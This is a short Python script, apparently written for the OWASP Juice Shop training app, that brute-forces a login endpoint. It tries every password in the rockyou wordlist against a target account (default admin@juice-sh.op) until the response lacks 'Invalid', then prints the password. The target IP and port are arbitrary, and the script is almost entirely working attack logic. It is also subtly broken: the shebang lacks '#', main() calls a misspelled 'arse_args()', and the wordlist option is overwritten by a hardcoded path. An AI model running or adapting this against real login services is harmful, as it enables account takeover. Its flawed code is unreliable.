!/usr/bin/python3

import requests
import json
import argparse

def parse_args():
    parser = argparse.ArgumentParser(description='A password cracker for the Juice Shop app!')
    parser.add_argument('-i', dest='ip', help='specify an ip', required=True)
    parser.add_argument('-f', dest='file', help='specify a dictionary file', default='/usr/share/wordlists/rockyou.txt')
    parser.add_argument('-p', dest='port', help='specify a port number', default='3000')
    parser.add_argument('-u', dest='user', help='specify a user', default='admin@juice-sh.op')
    return parser.parse_args()

def submit_call(url,headers,data):

    check_me = False

    response = requests.post(url=url, headers=headers, data=data)
    if not 'Invalid' in response.text:
        check_me = True
    response.close()

    return check_me


def main():

    p = arse_args()

    ip = p.ip
    pass_file = p.file
    port = p.port
    user = p.user

    
    try:
        url = 'http://' + ip + ':' + str(port) + '/rest/user/login'
        pass_file = '/usr/share/wordlists/rockyou.txt'

        headers = {
            'Content-Type':'application/json'
        }

        with open(pass_file, 'r', errors='ignore') as pf:
            for line in pf.readlines():
                password = line.rstrip()

                data_dic = {'email':user,'password':password}
                data = json.dumps(data_dic)

                if submit_call(url=url,headers=headers,data=data):
                    print('The password is: ' + password)
                    break

    except Exception as e:
        print('[-] Unexpected error: ' + str(e))


if __name__ == '__main__':
    main()
